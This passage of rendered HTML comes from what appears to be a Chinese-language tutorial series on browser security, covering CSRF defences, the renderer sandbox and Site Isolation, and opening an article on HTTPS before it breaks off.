punctuation">"</span></span><span class="token punctuation">></span></span>\n      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>csrf-token<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>gdshtr45q1g<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>\n      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>user<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>\n      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>number<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>\n      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>\n  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>第二步，在浏览器端如果要发起转账的请求，那么需要带上页面中的 CSRF Token，然后服务器会验证该 Token 是否合法。如果是从第三方站点发出的请求，那么将无法获取到 CSRF Token 的值，所以即使发出了请求，服务器也会因为 CSRF Token 不正确而拒绝请求。</p>\n<h2 id="总结-5"><a href="#%E6%80%BB%E7%BB%93-5" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>总结</h2>\n<p>我们结合一个实际案例介绍了 CSRF 攻击，要发起 CSRF 攻击需要具备三个条件：目标站点存在漏洞、用户要登录过目标站点和黑客需要通过第三方站点发起攻击。</p>\n<p>根据这三个必要条件，我们又介绍了该如何防止 CSRF 攻击，具体来讲主要有三种方式：充分利用好 Cookie 的 SameSite 属性、验证请求的来源站点和使用 CSRF Token。这三种方式需要合理搭配使用，这样才可以有效地防止 CSRF 攻击。</p>\n<p>再结合前面两篇文章，我们可以得出页面安全问题的主要原因就是浏览器为同源策略开的两个“后门”：一个是在页面中可以任意引用第三方资源，另外一个是通过 CORS 策略让 XMLHttpRequest 和 Fetch 去跨域请求资源。</p>\n<p>为了解决这些问题，我们引入了 CSP 来限制页面任意引入外部资源，引入了 HttpOnly 机制来禁止 XMLHttpRequest 或者 Fetch 发送一些关键 Cookie，引入了 SameSite 和 Origin 来防止 CSRF 攻击。</p>\n<p>通过这三篇文章的分析，相信你应该已经能搭建 Web 页面安全的知识体系网络了。有了这张网络，你就可以将 HTTP 请求头和响应头中各种安全相关的字段关联起来，比如 Cookie 中的一些字段，还有 X-Frame-Options、X-Content-Type-Options、X-XSS-Protection 等字段，也可以将 CSP、CORS 这些知识点关联起来。当然这些并不是浏览器安全的全部，后面两篇文章我们还会介绍</p>\n<h1 id="沙盒：页面和系统之间的隔离墙"><a href="#%E6%B2%99%E7%9B%92%EF%BC%9A%E9%A1%B5%E9%9D%A2%E5%92%8C%E7%B3%BB%E7%BB%9F%E4%B9%8B%E9%97%B4%E7%9A%84%E9%9A%94%E7%A6%BB%E5%A2%99" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>沙盒：页面和系统之间的隔离墙</h1>\n<p>从稳定性视角来看，单进程架构的浏览器是不稳定的，因为只要浏览器进程中的任意一个功能出现异常都有可能影响到整个浏览器，如页面卡死、浏览器崩溃等。不过浏览器的稳定性并不是本文讨论的重点，我们今天主要聊的是浏览器架构是如何影响到操作系统安全的</p>\n<p>浏览器本身的漏洞是单进程浏览器的一个主要问题，如果浏览器被曝出存在漏洞，那么在这些漏洞没有被及时修复的情况下，黑客就有可能通过恶意的页面向浏览器中注入恶意程序，其中最常见的攻击方式是利用缓冲区溢出，不过需要注意这种类型的攻击和 XSS 注入的脚本是不一样的</p>\n<ul>\n<li>XSS 攻击只是将恶意的 JavaScript 脚本注入到页面中，虽然能窃取一些 Cookie 相关的数据，但是 XSS 无法对操作系统进行攻击。</li>\n<li>而通过浏览器漏洞进行的攻击是可以入侵到浏览器进程内部的，可以读取和修改浏览器进程内部的任意内容，还可以穿透浏览器，在用户的操作系统上悄悄地安装恶意软件、监听用户键盘输入信息以及读取用户硬盘上的文件内容。</li>\n</ul>\n<blockquote>\n<p>和 XSS 攻击页面相比，这类攻击无疑是枚“核弹”，它会将整个操作系统的内容都暴露给黑客，这样我们操作系统上所有的资料都是不安全的了。</p>\n</blockquote>\n<h2 id="安全视角下的多进程架构"><a href="#%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84%E5%A4%9A%E8%BF%9B%E7%A8%8B%E6%9E%B6%E6%9E%84" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>安全视角下的多进程架构</h2>\n<p>现代浏览器的设计目标是安全、快速和稳定，而这种核弹级杀伤力的安全问题就是一个很大的潜在威胁，因此在设计现代浏览器的体系架构时，需要解决这个问题。</p>\n<p>\n  <a\n    class="gatsby-resp-image-link"\n    href="/static/2021-07-15-14-57-34-f5abd857f8520257071a24fbee950130-09eb7.png"\n    style="display: block"\n    target="_blank"\n    rel="noopener"\n  >\n  \n  <span\n    class="gatsby-resp-image-wrapper"\n    style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;"\n  >\n    <span\n      class="gatsby-resp-image-background-image"\n      style="padding-bottom: 89.66725043782837%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAASCAIAAADUsmlHAAAACXBIWXMAAA7DAAAOwwHHb6hkAAACmklEQVQ4y4WSzU8TQRjG+Xs8eBBNTJRYCF70oGKiQeOBhINeCBw0MXrwYDwpAgmQWIWUDzFAS6J8REpLRMOKYgUqa6Fl2122dHe7253d7cx+t05paAwp8OTNZHcyv+d95s3UFCsqFPCi85nM2g/hzy9h4ydPhPmVLxyxyEdXhc0IF/luArlyEqvmP7a0pbKML/y3J0T3L1BvZ6Jv5siB6bX+ENUdZj7Mr9uyeBysMPSdIa7WazcMouaAfXPcag6YjT79jNe576OKIHssvEu3jPF172B9X/piF1Xvlet6054e6sKg0TaaPAlm6Jb3nMfnXB5QPH3pS72spzfd6BXrfG7b6EmdAZO6PcSf7snWvoyf7WbPe/O1nfS5zuSpV+nWgXgRCMfBusB9Dq8HwrHxud+jn1anFmOT89Gp0OZkiAwvRlz1iGmXecMwCiYsWggpoqbk8CZUcgXXLBZwWY5jFw7Iw7DrugAAKpli2DRQNUGU8AdekWEi3UTYWDdsyzoSVlWVJMlUKoUQSiaTBEFkMpksz8u5nGsiIRXVYb6cskpsSZISiQSGcQTMl56Nqgo8pyqqg3tre6ZpVO9sWZYoivF4nKbpnCwrioLtOI7TS0IQmxmW7TjVYRmAfB4a+9pl2a0D4fy6bkCkQwixY3UYJ3Ts0jyxPc/zLMtuJxIZjsO1f0kXVxW4PH9VAV1flfZZ9CQIXy+b/o3805D5eMH0R+GzoNYSQB3T2s6eVDl/GH44p10ft+9N2e2zRtcSuDVhNvutziXlwUd0Y8JpGkMkU4LdqvCjGblpDN6dyHfMaC+C4tVh7coIfB7MtfpBwyC8NgxIOnsYLktT1TUqS8QlYluM7IgxJru8LeLf2K4UoaRvW9JKXJRkpdLsH4YkwDIK4yM2AAAAAElFTkSuQmCC\'); background-size: cover; display: block;"\n    >\n      <img\n        class="gatsby-resp-image-image"\n        style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;"\n        alt="2021 07 15 14 57 34"\n        title=""\n        src="/static/2021-07-15-14-57-34-f5abd857f8520257071a24fbee950130-fee1c.png"\n        srcset="/static/2021-07-15-14-57-34-f5abd857f8520257071a24fbee950130-a67b7.png 200w,\n/static/2021-07-15-14-57-34-f5abd857f8520257071a24fbee950130-0b187.png 400w,\n/static/2021-07-15-14-57-34-f5abd857f8520257071a24fbee950130-fee1c.png 800w,\n/static/2021-07-15-14-57-34-f5abd857f8520257071a24fbee950130-09eb7.png 1142w"\n        sizes="(max-width: 800px) 100vw, 800px"\n      />\n    </span>\n  </span>\n  \n  </a>\n    </p>\n<p>观察上图，我们知道浏览器被划分为浏览器内核和渲染内核两个核心模块，其中浏览器内核是由网络进程、浏览器主进程和 GPU 进程组成的，渲染内核就是渲染进程。那如果我们在浏览器中打开一个页面，这两个模块是怎么配合的呢？</p>\n<p>所有的网络资源都是通过浏览器内核来下载的，下载后的资源会通过 IPC 将其提交给渲染进程（浏览器内核和渲染进程之间都是通过 IPC 来通信的）。然后渲染进程会对这些资源进行解析、绘制等操作，最终生成一幅图片。但是渲染进程并不负责将图片显示到界面上，而是将最终生成的图片提交给浏览器内核模块，由浏览器内核模块负责显示这张图片。</p>\n<p>设计现代浏览器体系架构时，将浏览器划分为不同的进程是为了增加其稳定性。虽然设计成了多进程架构，不过这些模块之间的沟通方式却有些复杂，也许你还有以下问题：</p>\n<ul>\n<li>为什么一定要通过浏览器内核去请求资源，再将数据转发给渲染进程，而不直接从进程内部去请求网络资源？</li>\n<li>为什么渲染进程只负责生成页面图片，生成图片还要经过 IPC 通知浏览器内核模块，然后让浏览器内核去负责展示图片？</li>\n</ul>\n<p>通过以上方式不是增加了工程的复杂度吗？</p>\n<p>要解释现代浏览器为什么要把这个流程弄得这么复杂，我们就得从系统安全的角度来分析。</p>\n<h2 id="安全沙箱"><a href="#%E5%AE%89%E5%85%A8%E6%B2%99%E7%AE%B1" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>安全沙箱</h2>\n<p>不过在解释这些问题之前，我们得先看看什么是安全沙箱。</p>\n<p>上面我们分析过了，由于渲染进程需要执行 DOM 解析、CSS 解析、网络图片解码等操作，如果渲染进程中存在系统级别的漏洞，那么以上操作就有可能让恶意的站点获取到渲染进程的控制权限，进而又获取操作系统的控制权限，这对于用户来说是非常危险的。</p>\n<p>因为网络资源的内容存在着各种可能性，所以浏览器会默认所有的网络资源都是不可信的，都是不安全的。但谁也不能保证浏览器不存在漏洞，只要出现漏洞，黑客就可以通过网络内容对用户发起攻击。</p>\n<p>我们知道，如果你下载了一个恶意程序，但是没有执行它，那么恶意程序是不会生效的。同理，浏览器之于网络内容也是如此，浏览器可以安全地下载各种网络资源，但是如果要执行这些网络资源，比如解析 HTML、解析 CSS、执行 JavaScript、图片编解码等操作，就需要非常谨慎了，因为一不小心，黑客就会利用这些操作对含有漏洞的浏览器发起攻击。</p>\n<p>基于以上原因，我们需要在渲染进程和操作系统之间建一道墙，即便渲染进程由于存在漏洞被黑客攻击，但由于这道墙，黑客就获取不到渲染进程之外的任何操作权限。将渲染进程和操作系统隔离的这道墙就是我们要聊的安全沙箱</p>\n<p>浏览器中的安全沙箱是利用操作系统提供的安全技术，让渲染进程在执行过程中无法访问或者修改操作系统中的数据，在渲染进程需要访问系统资源的时候，需要通过浏览器内核来实现，然后将访问的结果通过 IPC 转发给渲染进程。</p>\n<p>安全沙箱最小的保护单位是进程。因为单进程浏览器需要频繁访问或者修改操作系统的数据，所以单进程浏览器是无法被安全沙箱保护的，而现代浏览器采用的多进程架构使得安全沙箱可以发挥作用。</p>\n<h2 id="安全沙箱如何影响各个模块功能"><a href="#%E5%AE%89%E5%85%A8%E6%B2%99%E7%AE%B1%E5%A6%82%E4%BD%95%E5%BD%B1%E5%93%8D%E5%90%84%E4%B8%AA%E6%A8%A1%E5%9D%97%E5%8A%9F%E8%83%BD" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>安全沙箱如何影响各个模块功能</h2>\n<p>我们知道安全沙箱最小的保护单位是进程，并且能限制进程对操作系统资源的访问和修改，这就意味着如果要让安全沙箱应用在某个进程上，那么这个进程必须没有读写操作系统的功能，比如读写本地文件、发起网络请求、调用 GPU 接口等。</p>\n<p>了解了被安全沙箱保护的进程会有一系列的受限操作之后，接下来我们就可以分析渲染进程和浏览器内核各自都有哪些职责，如下图：</p>\n<p>\n  <a\n    class="gatsby-resp-image-link"\n    href="/static/2021-07-15-14-58-41-3fc19f72da4bcb4b3d90b896d9a37c3c-09eb7.png"\n    style="display: block"\n    target="_blank"\n    rel="noopener"\n  >\n  \n  <span\n    class="gatsby-resp-image-wrapper"\n    style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;"\n  >\n    <span\n      class="gatsby-resp-image-background-image"\n      style="padding-bottom: 64.44833625218914%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAIAAAAmMtkJAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABBUlEQVQoz3WRVw7DQAgFc/9Lusm917gnIyORyN7lwwLMAI99fR52HMf7sn3f+W7bJuGyLLfK1w07z5M6x3Fc122apuu6tm0JPc+L41gKzDBDqqrK87woimEY6JIkCc44jnVd04tfJM0wRmmWZWEYTtNE2Pc9o/BJ0jeKonmeycv8HywxQ8qyZCBbKLyuKyQS0jSVvHUyG1KqsOgEC4KAzc2aJVtexnqiTWE6cjD2MlxbSAC9MNUkBcbYiOF8rU+FNjAEc1WOpDCOHJLQCoshmBbiK8xGvu9bNavxyE+YjpBmzf9PxSNzMBhC9MvOCOZg8IjS4ffJyAbgWgITSkcyHAKHFRT+AlzZ9K8ooc93AAAAAElFTkSuQmCC\'); background-size: cover; display: block;"\n    >\n      <img\n        class="gatsby-resp-image-image"\n        style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;"\n        alt="2021 07 15 14 58 41"\n        title=""\n        src="/static/2021-07-15-14-58-41-3fc19f72da4bcb4b3d90b896d9a37c3c-fee1c.png"\n        srcset="/static/2021-07-15-14-58-41-3fc19f72da4bcb4b3d90b896d9a37c3c-a67b7.png 200w,\n/static/2021-07-15-14-58-41-3fc19f72da4bcb4b3d90b896d9a37c3c-0b187.png 400w,\n/static/2021-07-15-14-58-41-3fc19f72da4bcb4b3d90b896d9a37c3c-fee1c.png 800w,\n/static/2021-07-15-14-58-41-3fc19f72da4bcb4b3d90b896d9a37c3c-09eb7.png 1142w"\n        sizes="(max-width: 800px) 100vw, 800px"\n      />\n    </span>\n  </span>\n  \n  </a>\n    </p>\n<p>通过该图，我们可以看到由于渲染进程需要安全沙箱的保护，因此需要把在渲染进程内部涉及到和系统交互的功能都转移到浏览器内核中去实现。</p>\n<p>那安全沙箱是如何影响到各个模块功能的呢？</p>\n<h3 id="持久存储"><a href="#%E6%8C%81%E4%B9%85%E5%AD%98%E5%82%A8" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>持久存储</h3>\n<p>我们先来看看安全沙箱是如何影响到浏览器持久存储的。由于安全沙箱需要负责确保渲染进程无法直接访问用户的文件系统，但是在渲染进程内部有访问 Cookie 的需求、有上传文件的需求，为了解决这些文件的访问需求，所以现代浏览器将读写文件的操作全部放在了浏览器内核中实现，然后通过 IPC 将操作结果转发给渲染进程。</p>\n<p>具体地讲，如下文件内容的读写都是在浏览器内核中完成的：</p>\n<ul>\n<li>存储 Cookie 数据的读写。通常浏览器内核会维护一个存放所有 Cookie 的 Cookie 数据库，然后当渲染进程通过 JavaScript 来读取 Cookie 时，渲染进程会通过 IPC 将读取 Cookie 的信息发送给浏览器内核，浏览器内核读取 Cookie 之后再将内容返回给渲染进程。</li>\n<li>一些缓存文件的读写也是由浏览器内核实现的，比如网络文件缓存的读取。</li>\n</ul>\n<h3 id="网络访问"><a href="#%E7%BD%91%E7%BB%9C%E8%AE%BF%E9%97%AE" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>网络访问</h3>\n<p>同样有了安全沙箱的保护，在渲染进程内部也是不能直接访问网络的，如果要访问网络，则需要通过浏览器内核。不过浏览器内核在处理 URL 请求之前，会检查渲染进程是否有权限请求该 URL，比如检查 XMLHttpRequest 或者 Fetch 是否是跨站点请求，或者检测 HTTPS 的站点中是否包含了 HTTP 的请求。</p>\n<h3 id="用户交互"><a href="#%E7%94%A8%E6%88%B7%E4%BA%A4%E4%BA%92" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>用户交互</h3>\n<p>渲染进程实现了安全沙箱，还影响到了一个非常重要的用户交互功能。</p>\n<p>通常情况下，如果你要实现一个 UI 程序，操作系统会提供一个界面给你，该界面允许应用程序与用户交互，允许应用程序在该界面上进行绘制，比如 Windows 提供的是 HWND，Linux 提供的 X Window，我们就把 HWND 和 X Window 统称为窗口句柄。应用程序可以在窗口句柄上进行绘制和接收键盘鼠标消息。</p>\n<p>不过在现代浏览器中，由于每个渲染进程都有安全沙箱的保护，所以在渲染进程内部是无法直接操作窗口句柄的，这也是为了限制渲染进程监控到用户的输入事件。</p>\n<p>由于渲染进程不能直接访问窗口句柄，所以渲染进程需要完成以下两点大的改变。</p>\n<ol>\n<li>渲染进程需要渲染出位图。为了向用户显示渲染进程渲染出来的位图，渲染进程需要将生成好的位图发送到浏览器内核，然后浏览器内核将位图复制到屏幕上。</li>\n<li>操作系统没有将用户输入事件直接传递给渲染进程，而是将这些事件传递给浏览器内核。然后浏览器内核再根据当前浏览器界面的状态来判断如何调度这些事件，如果当前焦点位于浏览器地址栏中，则输入事件会在浏览器内核内部处理；如果当前焦点在页面的区域内，则浏览器内核会将输入事件转发给渲染进程。</li>\n</ol>\n<p>之所以这样设计，就是为了限制渲染进程有监控到用户输入事件的能力，所以所有的键盘鼠标事件都是由浏览器内核来接收的，然后浏览器内核再通过 IPC 将这些事件发送给渲染进程。</p>\n<p>上面我们分析了由于渲染进程引入了安全沙箱，所以浏览器的持久存储、网络访问和用户交互等功能都不能在渲染进程内直接使用了，因此我们需要把这些功能迁移到浏览器内核中去实现，这让原本比较简单的流程变得复杂了。</p>\n<h2 id="站点隔离（site-isolation）"><a href="#%E7%AB%99%E7%82%B9%E9%9A%94%E7%A6%BB%EF%BC%88site-isolation%EF%BC%89" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>站点隔离（Site Isolation）</h2>\n<p>所谓站点隔离是指 Chrome 将同一站点（包含了相同根域名和相同协议的地址）中相互关联的页面放到同一个渲染进程中执行。</p>\n<p>最开始 Chrome 划分渲染进程是以标签页为单位，也就是说整个标签页会被划分给某个渲染进程。但是，按照标签页划分渲染进程存在一些问题，原因就是一个标签页中可能包含了多个 iframe，而这些 iframe 又有可能来自于不同的站点，这就导致了多个不同站点中的内容通过 iframe 同时运行在同一个渲染进程中。</p>\n<p>目前所有操作系统都面临着两个 A 级漏洞——幽灵（Spectre）和熔毁（Meltdown），这两个漏洞是由处理器架构导致的，很难修补，黑客通过这两个漏洞可以直接入侵到进程的内部，如果入侵的进程没有安全沙箱的保护，那么黑客还可以发起对操作系统的攻击。</p>\n<p>所以如果一个银行站点包含了一个恶意 iframe，然后这个恶意的 iframe 利用这两个 A 级漏洞去入侵渲染进程，那么恶意程序就能读取银行站点渲染进程内的所有内容了，这对于用户来说就存在很大的风险了。</p>\n<p>因此 Chrome 几年前就开始重构代码，将标签级的渲染进程重构为 iframe 级的渲染进程，然后严格按照同一站点的策略来分配渲染进程，这就是 Chrome 中的站点隔离。</p>\n<p>实现了站点隔离，就可以将恶意的 iframe 隔离在恶意进程内部，使得它无法继续访问其他 iframe 进程的内容，因此也就无法攻击其他站点了。</p>\n<p>值得注意是，2019 年 10 月 20 日 Chrome 团队宣布安卓版的 Chrome 已经全面支持站点隔离</p>\n<h1 id="https：让数据传输更安全"><a href="#https%EF%BC%9A%E8%AE%A9%E6%95%B0%E6%8D%AE%E4%BC%A0%E8%BE%93%E6%9B%B4%E5%AE%89%E5%85%A8" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>HTTPS：让数据传输更安全</h1>\n<p>浏览器安全主要划分为三大块内容：页面安全、系统安全和网络安全。前面我们用四篇文章介绍了页面安全和系统安全，也聊了浏览器和 Web 开发者是如何应对各种类型的攻击，本文是我们专栏的最后一篇，我们就接着来聊聊网络安全协议 HTTPS。</p>\n<p>我们先从 HTTP 的明文传输的特性讲起，在上一个模块的三篇文章中我们分析过，起初设计 HTTP 协议的目的很单纯，就是为了传输超文本文件，那时候也没有太强的加密传输的数据需求，所以 HTTP 一直保持着明文传输数据的特征。但这样的话，在传输过程中的每一个环节，数据都有可能被窃取或者篡改，这也意味着你和服务器之间还可能有个中间人，你们在通信过程中的一切内容都在中间人的掌握中，如下图：</p>\n<p>\n  <a\n    class="gatsby-resp-image-link"\n    href="/static/2021-07-15-15-02-06-7a55240c320a9546419ca53ac4890d1d-9e7f9.png"\n    style="display: block"\n    target="_blank"\n    rel="noopener"\n  >\n  \n  <span\n    class="gatsby-resp-image-wrapper"\n    style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;"\n  >\n    <span\n      class="gatsby-resp-image-background-image"\n      style="padding-bottom: 54.802259887005654%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABkElEQVQoz31RTS9DQRSd2PobgoivLlhZaKIa9jYoC4lQa/4AGwuJRCQWVpIK9QsIQVoWmqAiqaqmjdZCSKed92bevHnzYV6fNlXiZGYyuXPuuefeAUpJpbfUy718Qwj69oozKZJNu69C6NNyZBHyQomXsPBYoAjF+ileO8GRG9NALioQmkJmdzaSS1Of+ZxBSLlcsQmKpdHCIVqMokjC8uqBp3ce2ivPRtDmOWbMcRy9OWPseXUltTzPKHU4txlTyknk6dKREY6i/XryhyGid/ZuDB4/msqLKcUJJrkXpwIls2sxVTL51VPptsAK0LWtY6DepWWWMcaqAbIK767t6H4EtxsJQD8K6cpoWrVl9GNyVeguIISc85poLbmJRwipuECX8fjZxcV98kFrIUI8fpMq+NPndSzW2tICABgcGDjYj0wG/DPjwdDY6EzAH56epLY3CNlcWVS/NJNOD/n6fO1tc6HQ9tbWcFdHoL9n1Ncb7O6cCI5YlP6drGr25C+TrvQ/thtBKTUMw7Ks3/Or4wsx8U5GLxZcnAAAAABJRU5ErkJggg==\'); background-size: 